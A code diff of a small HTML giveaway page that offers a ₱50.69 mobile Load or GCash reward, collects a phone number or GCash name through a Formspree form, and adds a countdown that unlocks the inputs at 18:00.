@@ -1,481 +1,190 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-      -webkit-tap-highlight-color: transparent;
-      -webkit-focus-ring-color: transparent;
-      outline: none !important;
-      box-shadow: none !important;
-    }
-    *:active, *:focus { outline: none !important; box-shadow: none !important; }
-
-    body {
-      height: 100vh;
-      width: 100vw;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #0a0a0a;
-      color: #fff;
-      position: relative;
-    }
-
-    .bg-video, .bg-image {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: -2;
-    }
-
-    html, body {
-      -webkit-user-select: none; 
-      -webkit-touch-callout: none;
-      user-select: none;
-      touch-action: manipulation;
-    }
-
-    .bg-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.65);
-      z-index: -1;
-    }
-
-    .container {
-      width: min(90%, 400px);
-      background: rgba(255, 255, 255, 0.07);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      padding: clamp(1.5rem, 4vw, 2rem);
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0, 255, 200, 0.25);
-      text-align: center;
-      backdrop-filter: blur(20px) saturate(160%);
-      -webkit-backdrop-filter: blur(20px) saturate(160%);
-      transition: background 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    h1 { 
-      font-size: 2.2rem; 
-      color: #00ffc6; 
-      margin-bottom: 0.5rem; 
-      text-shadow: 0 0 10px #00ffc6; 
-    }
-
-    h2 { 
-      color: #fff;
-      font-size: 1.3rem;
-      margin-bottom: 1rem;
-    }
-
-    .reward-type { display: flex;
-      justify-content: center; 
-      gap: 1rem; 
-      margin-bottom: 1.5rem; 
-    }
-    .reward-btn {
-      padding: 0.6rem 1.2rem;
-      border-radius: 30px;
-      border: 2px solid #00ffc6;
-      background: transparent;
-      color: #00ffc6;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      transform: scale(1);
-    }
-    .reward-btn:hover { 
-      background: rgba(0, 255, 198, 0.1); }
-    .reward-btn:active { 
-      transform: scale(0.95); 
-      box-shadow: 0 0 20px rgba(0,255,198,0.6); 
-    }
-    .reward-btn.active { 
-      background: #00ffc6; 
-      color: #000; 
-      box-shadow: 0 0 15px #00ffc6; 
-    }
-
-    input, select, button {
-      width: 100%;
-      padding: 0.9rem;
-      margin-bottom: 1rem;
-      border: none;
-      border-radius: 10px;
-      font-size: 1rem;
-    }
-
-    input, select {
-      background: rgba(255, 255, 255, 0.15);
-      color: #fff;
-      outline: none;
-      border: 1px solid rgba(0, 255, 200, 0.25);
-      transition: border 0.3s ease, box-shadow 0.3s ease;
-    }
-    input:focus, select:focus { 
-      border-color: #00ffc6; 
-      box-shadow: 0 0 8px #00ffc6; 
-    }
-    input::placeholder { 
-      color: #bbb; 
-    }
-
-    select { appearance: none; -webkit-appearance: none; -moz-appearance: none; background-image: none; }
-    select option { background-color: #1a1a1a; color: #fff; }
-
-    button {
-      background: linear-gradient(90deg, #00ffc6, #007bff);
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-      border-radius: 50px;
-      transition: all 0.25s ease;
-      box-shadow: 0 0 10px rgba(0,255,200,0.3);
-    }
-    button:hover { 
-      background: linear-gradient(90deg, #00cc99, #0055aa); 
-      color: #fff; 
-      box-shadow: 0 0 20px #00ffc6; 
-    }
-    button:active { 
-      transform: scale(0.96); 
-      box-shadow: 0 0 25px rgba(0,255,200,0.6); 
-    }
-
-    .lx-logo {
-      position: fixed;
-      bottom: 15px;
-      width: 100%;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #00ffc6;
-      letter-spacing: 3px;
-      text-shadow: 0 0 8px #00ffc6;
-      opacity: 0.8;
-      user-select: none;
-    }
-
-    @media (max-width: 400px) {
-      h1 { 
-        font-size: 1.5rem; 
-      }
-      h2 { 
-        font-size: 1.1rem; 
-      }
-      .container { 
-        padding: 1.3rem; 
-      }
-    }
-
-    .popup-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.6);
-      backdrop-filter: blur(5px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s ease;
-      z-index: 9999;
-    }
-    .popup-overlay.show { 
-      opacity: 1; 
-      pointer-events: auto; 
-    }
-
-    .popup-content {
-      background: transparent;
-      padding: 2rem;
-      border-radius: 20px;
-      text-align: center;
-      color: #00ffc6;
-      font-weight: bold;
-      backdrop-filter: blur(20px) saturate(160%);
-      -webkit-backdrop-filter: blur(20px) saturate(160%);
-
-        width: 90%;          
-        max-width: 400px;    
-        box-sizing: border-box;
-    }
-    .popup-content button {
-      margin-top: 1rem;
-      padding: 0.6rem 1.5rem;
-      border-radius: 30px;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-      background: linear-gradient(90deg, #00ffc6, #007bff);
-     
-      transition: all 0.25s ease;
-    }
-    .popup-content button:hover {
-      background: linear-gradient(90deg, #00cc99, #0055aa);
-      color: #fff;
-    }
-
-
-
-        /*
-      .popup-mini {
-        display: inline-block;         
-        background: rgba(0, 255, 198, 0.2); 
-        padding: 0.3rem 0.8rem;
-        border-radius: 12px;
-        font-weight: bold;
-        color: #00ffc6;
-        backdrop-filter: blur(8px) saturate(150%);
-        -webkit-backdrop-filter: blur(8px) saturate(150%);
-        text-align: center;
-        font-size: 0.85rem;
-        box-shadow: 0 0 10px rgba(0,255,200,0.3);
-        pointer-events: none;          
-      }
-
-      
-      @media (max-width: 400px) {
-        .popup-mini {
-          font-size: 0.75rem;
-          padding: 0.25rem 0.6rem;
-        }
-      }
-      */
-
-
-
-    .reward-badge {
-      font-family: 'Poppins', sans-serif;
-      font-weight: bold;
-      text-align: center;
-      display: inline;      
-      cursor: default;
-      color: #00ffc6;       
-      transition: color 0.2s ease;
-    }
-
-    .reward-badge .status {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      color: #ffcc00;       
-      margin-right: 0.3rem; 
-      margin-top: 0.2rem;
-    }
-
-    .reward-badge .value {
-      font-size: 1rem;
-      color: #fff;        
-    }
-
-
-    .reward-badge .time {
-      font-size: 0.7rem;
-      color: #888;        
-      font-weight: normal; 
-      margin-top: 1px;
-      
-
-
-
-
-    }
-
-
-
-
-
-  
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }
+body { height:100vh; width:100vw; display:flex; justify-content:center; align-items:center; background:#0a0a0a; color:#fff; position:relative; }
+.bg-video, .bg-image { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-2; }
+.bg-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.65); z-index:-1; }
+.container { width:min(90%,400px); background: rgba(255,255,255,0.07); border:1px solid rgba(255,255,255,0.15); padding:clamp(1.5rem,4vw,2rem); border-radius:20px; /*box-shadow:0 0 30px rgba(0,255,200,0.25);*/ text-align:center; backdrop-filter:blur(20px) saturate(160%); -webkit-backdrop-filter:blur(20px) saturate(160%); }
+h1 { font-size:2.2rem; color:#00ffc6; margin-bottom:0.5rem; text-shadow:0 0 10px #00ffc6; }
+h2 { color:#fff; font-size:1.3rem; margin-bottom:1rem; }
+.reward-type { display:flex; justify-content:center; gap:1rem; margin-bottom:1.5rem; }
+.reward-btn { padding:0.6rem 1.2rem; border-radius:30px; border:2px solid #00ffc6; background:transparent; color:#00ffc6; font-weight:600; cursor:pointer; transition:all 0.25s ease; }
+.reward-btn:hover { background: rgba(0,255,198,0.1); }
+.reward-btn.active { background:#00ffc6; color:#000; box-shadow:0 0 15px #00ffc6; }
+input, select, button { width:100%; padding:0.9rem; margin-bottom:1rem; border:none; border-radius:10px; font-size:1rem; }
+input, select { background: rgba(255,255,255,0.15); color:#fff; border:1px solid rgba(0,255,200,0.25); }
+input:focus, select:focus { border-color:#00ffc6; box-shadow:0 0 8px #00ffc6; }
+input::placeholder { color:#bbb; }
+select option { background-color:#1a1a1a; color:#fff; }
+button[type="submit"] { background:linear-gradient(90deg,#00ffc6,#007bff); color:#000; font-weight:bold; cursor:pointer; border-radius:50px; box-shadow:0 0 10px rgba(0,255,200,0.3); }
+button[type="submit"]:hover { background:linear-gradient(90deg,#00cc99,#0055aa); color:#fff; box-shadow:0 0 20px #00ffc6; }
+.lx-logo { position:fixed; bottom:15px; width:100%; text-align:center; font-size:0.9rem; color:#00ffc6; letter-spacing:3px; text-shadow:0 0 8px #00ffc6; opacity:0.8; }
+.popup-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); display:flex; justify-content:center; align-items:center; opacity:0; pointer-events:none; transition:0.3s; z-index:9999; }
+.popup-overlay.show { opacity:1; pointer-events:auto; }
+.popup-content { background:transparent; padding:2rem; border-radius:20px; text-align:center; color:#00ffc6; font-weight:bold; backdrop-filter:blur(20px) saturate(160%); width:90%; max-width:400px; }
+.popup-content button { margin-top:1rem; padding:0.6rem 1.5rem; border-radius:30px; border:none; font-weight:bold; cursor:pointer; background:linear-gradient(90deg,#00ffc6,#007bff); }
+.popup-content button:hover { background:linear-gradient(90deg,#00cc99,#0055aa); color:#fff; }
+.countdown { font-size:0.8rem; color:white; margin-top:0.5rem; }
+</style>
 </head>
-
 <body>
-  <video autoplay muted loop playsinline class="bg-video" id="bgVideo">
-    <source src="https://motionbgs.com/media/7763/choso-jjk.960x540.mp4" type="video/mp4"/>
-  </video>
-  <img src="your-fallback-image.jpg" alt="Background" class="bg-image" id="bgImage" style="display:none;" />
-  <div class="bg-overlay"></div>
+<video autoplay muted loop playsinline class="bg-video" id="bgVideo">
+  <source src="https://motionbgs.com/media/7763/choso-jjk.960x540.mp4" type="video/mp4"/>
+</video>
+<img src="your-fallback-image.jpg" alt="Background" class="bg-image" id="bgImage" style="display:none;" />
+<div class="bg-overlay"></div>
 
-
-  <div class="container">
-    <h1>GIFT</h1>
-    <h2>Value: ₱50.69 
-      <div class="reward-badge">
-      <div class="status">Pending</div>
-      <span class="time"> 15:01 - 16:59</span>
-      </div>
-    </h2>
-
-
-<!--<div class="popup-mini"><span>(FREE)</span></div>
--->
-    
-    <div class="reward-type">
-      <button type="button" id="loadBtn" class="reward-btn active">Load</button>
-      <button type="button" id="gcashBtn" class="reward-btn">GCash</button>
+<div class="container">
+  <h1>GIFT</h1>
+  <h2>Value: ₱50.69
+    <div class="reward-badge">
+      <p style="font-size: 0.6em; color:#ffcc00;">Pending: <span class="countdown" id="countdown">Loading...</span></p>
+      
+      <!--<div class="status">Pending</div>-->
+     
     </div>
+  </h2>
 
-    <form id="entryForm" action="https://formspree.io/f/xanpvjav" method="POST">
-      <input type="hidden" name="reward_type" id="rewardType" value="Load" />
-      <div id="loadForm">
-        <input type="tel" name="number" id="loadNumber" placeholder="Mobile number" required maxlength="11" inputmode="numeric" />
-        <select name="sim_type" required>
-          <option value="">Select SIM</option>
-          <option value="Smart">Smart</option>
-          <option value="Globe">Globe</option>
-          <option value="DITO">DITO</option>
-          <option value="TNT">TNT</option>
-          <option value="GOMO">GOMO</option>
-          <option value="TM">TM</option>
-          <option value="Sun">Sun</option>
-        </select>
-        <input type="text" name="promo" value="" placeholder="Promo preference (optional)" />
-      </div>
-      <div id="gcashForm" style="display:none;">
-        <input type="tel" name="gcash_number" id="gcashNumber" placeholder="G number" maxlength="11" inputmode="numeric" />
-        <input type="text" name="gcash_name" placeholder="G name" />
-      </div>
-      <button type="submit">Submit</button>
-    </form>
+  <div class="reward-type">
+    <button type="button" id="loadBtn" class="reward-btn active">Load</button>
+    <button type="button" id="gcashBtn" class="reward-btn">GCash</button>
   </div>
 
-  <div class="lx-logo"><span>LX</span></div>
-
-  <div class="popup-overlay" id="submissionPopup">
-    <div class="popup-content">
-      <p>Submission successful! Please allow some time for processing. — BEGULGA </p>
-      <button id="closePopup">Close</button>
+  <form id="entryForm" action="https://formspree.io/f/xanpvjav" method="POST">
+    <input type="hidden" name="reward_type" id="rewardType" value="Load" />
+    <div id="loadForm">
+      <input type="tel" name="number" id="loadNumber" placeholder="Mobile number" required maxlength="11" inputmode="numeric" />
+      <select name="sim_type" required>
+        <option value="">Select SIM</option>
+        <option value="Smart">Smart</option>
+        <option value="Globe">Globe</option>
+        <option value="DITO">DITO</option>
+        <option value="TNT">TNT</option>
+        <option value="GOMO">GOMO</option>
+        <option value="TM">TM</option>
+        <option value="Sun">Sun</option>
+      </select>
+      <input type="text" name="promo" placeholder="Promo preference (optional)" />
     </div>
+    <div id="gcashForm" style="display:none;">
+      <input type="tel" name="gcash_number" id="gcashNumber" placeholder="G number" maxlength="11" inputmode="numeric" />
+      <input type="text" name="gcash_name" placeholder="G name" />
+    </div>
+    <button type="submit">Submit</button>
+  </form>
+</div>
+
+<div class="lx-logo"><span>LX</span></div>
+
+<div class="popup-overlay" id="submissionPopup">
+  <div class="popup-content">
+    <p>Submission successful! Please allow some time for processing. — BEGULGA </p>
+    <button id="closePopup">Close</button>
   </div>
+</div>
 
-  <script>
+<script>
+const loadBtn = document.getElementById('loadBtn');
+const gcashBtn = document.getElementById('gcashBtn');
+const loadForm = document.getElementById('loadForm');
+const gcashForm = document.getElementById('gcashForm');
+const rewardTypeInput = document.getElementById('rewardType');
+const form = document.getElementById('entryForm');
+const bgVideo = document.getElementById('bgVideo');
+const bgImage = document.getElementById('bgImage');
+const popup = document.getElementById('submissionPopup');
+const closePopup = document.getElementById('closePopup');
+const countdownEl = document.getElementById('countdown');
 
-  let inputsEnabled = false; 
+loadBtn.addEventListener('click', () => {
+  loadBtn.classList.add('active');
+  gcashBtn.classList.remove('active');
+  loadForm.style.display = 'block';
+  gcashForm.style.display = 'none';
+  rewardTypeInput.value = 'Load';
+  loadForm.querySelectorAll('input, select').forEach(el => el.required=true);
+  gcashForm.querySelectorAll('input').forEach(el => el.required=false);
+});
+gcashBtn.addEventListener('click', () => {
+  gcashBtn.classList.add('active');
+  loadBtn.classList.remove('active');
+  gcashForm.style.display='block';
+  loadForm.style.display='none';
+  rewardTypeInput.value='GCash';
+  gcashForm.querySelectorAll('input').forEach(el=>el.required=true);
+  loadForm.querySelectorAll('input, select').forEach(el=>el.required=false);
+});
 
-    const inputs = document.querySelectorAll('input, textarea, select');
+bgVideo.onerror = ()=>{ bgVideo.style.display='none'; bgImage.style.display='block'; };
 
-    function updateInputLock() {
-      inputs.forEach(input => {
-        if (!inputsEnabled) {
-          if (input.tagName === 'SELECT') {
-            input.setAttribute('disabled', 'disabled');
-          } else {
-            input.setAttribute('readonly', 'readonly'); 
-          }
-          input.addEventListener('focus', showLockNote);
-          input.addEventListener('click', showLockNote);
-        } else {
-          if (input.tagName === 'SELECT') {
-            input.removeAttribute('disabled');
-          } else {
-            input.removeAttribute('readonly'); 
-          }
-          input.removeEventListener('focus', showLockNote);
-          input.removeEventListener('click', showLockNote);
-        }
-      });
-    }
+form.addEventListener('submit', e=>{
+  e.preventDefault();
+  const submitBtn = form.querySelector('button[type="submit"]');
+  submitBtn.disabled=true; submitBtn.style.opacity='0.6';
+  const formData = new FormData(form);
+  fetch(form.action, { method: form.method, body: formData, headers:{'Accept':'application/json'} })
+  .then(resp => { if(resp.ok){ form.reset(); popup.classList.add('show'); } else alert('Oops! Something went wrong.'); })
+  .catch(()=>alert('Error submitting form.'))
+  .finally(()=>{ submitBtn.disabled=false; submitBtn.style.opacity='1'; });
+});
+closePopup.addEventListener('click', ()=> popup.classList.remove('show'));
 
-    function showLockNote(e) {
-      const note = e.target.getAttribute('data-lock-note') || 'dipa pwde!';
-      alert(note); 
-      e.preventDefault();
-      e.stopPropagation();
-    }
+function allowOnlyNumbers(input){ input.addEventListener('input',()=>input.value=input.value.replace(/\D/g,'')); }
+allowOnlyNumbers(document.getElementById('loadNumber'));
+allowOnlyNumbers(document.getElementById('gcashNumber'));
 
-    updateInputLock();
+const targetTime = new Date();
+targetTime.setHours(18,0,0,0);
 
-    setInterval(updateInputLock, 1000);
+const lockedInputs = document.querySelectorAll('input, select, button.reward-btn, button[type="submit"]');
 
-    const loadBtn = document.getElementById('loadBtn');
-    const gcashBtn = document.getElementById('gcashBtn');
-    const loadForm = document.getElementById('loadForm');
-    const gcashForm = document.getElementById('gcashForm');
-    const rewardTypeInput = document.getElementById('rewardType');
-    const form = document.getElementById('entryForm');
-    const bgVideo = document.getElementById('bgVideo');
-    const bgImage = document.getElementById('bgImage');
-    const popup = document.getElementById('submissionPopup');
-    const closePopup = document.getElementById('closePopup');
+function updateCountdown(){
+  const now = new Date();
+  let diff = targetTime - now;
 
-    function allowOnlyNumbers(input) {
-      input.addEventListener('input', () => input.value = input.value.replace(/\D/g, ''));
-    }
-    allowOnlyNumbers(document.getElementById('loadNumber'));
-    allowOnlyNumbers(document.getElementById('gcashNumber'));
-
-    loadBtn.addEventListener('click', () => {
-      loadBtn.classList.add('active');
-      gcashBtn.classList.remove('active');
-      loadForm.style.display = 'block';
-      gcashForm.style.display = 'none';
-      rewardTypeInput.value = 'Load';
-      document.querySelectorAll('#loadForm input, #loadForm select').forEach(el => el.required = true);
-      document.querySelectorAll('#gcashForm input').forEach(el => el.required = false);
+  if(diff <= 0){
+    countdownEl.textContent = "Available!";
+    lockedInputs.forEach(input=>{
+      input.removeAttribute('disabled');
+      input.removeAttribute('readonly');
     });
-
-    gcashBtn.addEventListener('click', () => {
-      gcashBtn.classList.add('active');
-      loadBtn.classList.remove('active');
-      gcashForm.style.display = 'block';
-      loadForm.style.display = 'none';
-      rewardTypeInput.value = 'GCash';
-      document.querySelectorAll('#gcashForm input').forEach(el => el.required = true);
-      document.querySelectorAll('#loadForm input, #loadForm select').forEach(el => el.required = false);
+    clearInterval(timerInterval);
+  } else {
+    const hours = String(Math.floor(diff/3600000)).padStart(2,'0');
+    const minutes = String(Math.floor((diff%3600000)/60000)).padStart(2,'0');
+    const seconds = String(Math.floor((diff%60000)/1000)).padStart(2,'0');
+    countdownEl.textContent = `${hours}:${minutes}:${seconds}`;
+    lockedInputs.forEach(input=>{
+      if(input.tagName==='BUTTON') input.setAttribute('disabled','disabled');
+      else input.setAttribute('readonly','readonly');
     });
+  }
+}
 
-    bgVideo.onerror = () => {
-      bgVideo.style.display = 'none';
-      bgImage.style.display = 'block';
-    };
-
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-      const submitBtn = form.querySelector('button[type="submit"]');
-      submitBtn.disabled = true;
-      submitBtn.style.opacity = '0.6';
-
-      const formData = new FormData(form);
-      fetch(form.action, {
-        method: form.method,
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
-      .then(response => {
-        if (response.ok) {
-          form.reset();
-          popup.classList.add('show');
-        } else {
-          alert('Oops! Something went wrong.');
-        }
-      })
-      .catch(() => alert('Error submitting form.'))
-      .finally(() => {
-        submitBtn.disabled = false;
-        submitBtn.style.opacity = '1';
-      });
-    });
-
-    // Close popup
-    closePopup.addEventListener('click', () => {
-      popup.classList.remove('show');
-    });
+  function disableScroll() {
+    document.body.style.overflow = 'hidden'; 
+    document.body.style.height = '100vh';
     
-  </script>
+    window.addEventListener('wheel', preventDefault, { passive: false });
+    window.addEventListener('touchmove', preventDefault, { passive: false });
+  }
+
+  function preventDefault(e) {
+    e.preventDefault();
+  }
+
+  disableScroll();
+
+
+
+
+
+const timerInterval = setInterval(updateCountdown,1000);
+updateCountdown();
+</script>
 </body>
 </html>
-
-
